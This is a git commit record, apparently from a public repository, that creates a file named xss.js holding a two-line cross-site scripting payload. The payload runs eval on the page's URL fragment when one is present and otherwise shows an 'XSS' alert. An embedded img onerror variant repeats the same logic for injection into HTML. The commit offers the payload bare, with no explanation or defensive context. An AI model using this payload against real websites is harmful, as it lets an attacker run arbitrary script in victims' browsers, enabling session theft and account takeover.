68c078384592eb6aeddc82534445d1cf1c026acb
iamroot <51531531+ImposterGhost@users.noreply.github.com>
2021-11-25 14:55:34 +0700

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,2 @@
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert('XSS')}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert('XSS')}">
+msgbox+1
